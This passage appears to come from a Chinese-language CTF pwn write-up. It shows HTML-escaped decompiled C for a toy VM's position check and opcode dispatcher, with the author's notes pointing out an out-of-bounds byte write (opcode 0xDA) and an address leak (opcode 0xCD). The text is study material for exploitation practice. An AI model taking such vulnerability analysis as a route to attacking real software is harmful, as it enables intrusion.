class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;get_pos&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(__int64 &lt;span class=&#34;built_in&#34;&gt;map&lt;/span&gt;, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; XN, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; YN, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; y)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 result; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 pos; &lt;span class=&#34;comment&#34;&gt;// [rsp+28h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  pos = check(XN, YN, x, y);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( pos == &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; * pos + &lt;span class=&#34;built_in&#34;&gt;map&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;check&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; XN, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; YN, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; y)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 result; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( x &amp;lt; XN &amp;amp;&amp;amp; y &amp;lt; YN )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = XN * y + x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = &lt;span class=&#34;number&#34;&gt;-1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最内部是对我们提供的用来定位的 xy 的检查，然后 XN 是我们最开始输入的 x 的范围，因为我们确定了我们要顺序取指，所以，我这里直接将 YN 设置 1，将一个 2 维矩阵简化为以为的顺序，然后我们提供的初始位置都是从 0 开始，（0，0）并且下次取指只要对 x 进行加 1 的操作，y 一直为 0，这样从原来的 code [y][x] 直接简化为 code [x]。但是本质没有差别，知识实现了代码操作的简化。我们填入的 code，每次都会通过 strtoul (s, 0LL, 10) 转化为无符号的整数，储存在 64 位的空间中，这也是为什么我们 code 的空间是 8*x*y。&lt;/p&gt;
&lt;p&gt;接下来就是对 code 的解析，这一部分是最恶心的，太多种情况了&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; __int64 result; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; n; &lt;span class=&#34;comment&#34;&gt;// [rsp+1Ch] [rbp-24h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *buf; &lt;span class=&#34;comment&#34;&gt;// [rsp+28h] [rbp-18h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 s; &lt;span class=&#34;comment&#34;&gt;// [rsp+30h] [rbp-10h] OVERLAPPED BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 canary; &lt;span class=&#34;comment&#34;&gt;// [rsp+38h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  canary = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt;(&amp;amp;s, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(s));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  s = code;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;0x54&lt;/span&gt; )          &lt;span class=&#34;comment&#34;&gt;// 输出栈顶数据一字节&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#123;%c&amp;#125;&amp;quot;&lt;/span&gt;, (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)*(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)sRSP);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_55;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code &amp;gt; &lt;span class=&#34;number&#34;&gt;0x54&lt;/span&gt;u )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;0xCC&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      pop_(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);                                 &lt;span class=&#34;comment&#34;&gt;// 数值与初始值相比，大于等于1，现在的数值就减一&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_55;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code &amp;gt; &lt;span class=&#34;number&#34;&gt;0xCC&lt;/span&gt;u )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code != &lt;span class=&#34;number&#34;&gt;0xD0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code &amp;gt; &lt;span class=&#34;number&#34;&gt;0xD0&lt;/span&gt;u )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;0xD1&lt;/span&gt; )  &lt;span class=&#34;comment&#34;&gt;// 结束&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;0xDA&lt;/span&gt; &amp;amp;&amp;amp; *(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&amp;amp;s + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;lt; size_X * size_Y )&lt;span class=&#34;comment&#34;&gt;// 只检查了offset是否大于边界，但是未考虑到rsp,数组越界&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            *(_BYTE *)(sRSP + *(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&amp;amp;s + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)) = BYTE5(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;0xCD&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          buf = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(BYTE1(s));               &lt;span class=&#34;comment&#34;&gt;// malloc (0xe0)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;content: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          n = read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, buf, BYTE1(s));           &lt;span class=&#34;comment&#34;&gt;// read 0xcd&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( n &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; *((_BYTE *)buf + n - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) == &lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            *((_BYTE *)buf + n - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;You say \&amp;quot;%s\&amp;quot;\n&amp;quot;&lt;/span&gt;, (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)buf);&lt;span class=&#34;comment&#34;&gt;// 泄露地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_55;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;0x98&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        pop_(&lt;span class=&#34;number&#34;&gt;4u&lt;/span&gt;);                               &lt;span class=&#34;comment&#34;&gt;// pop （int）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; 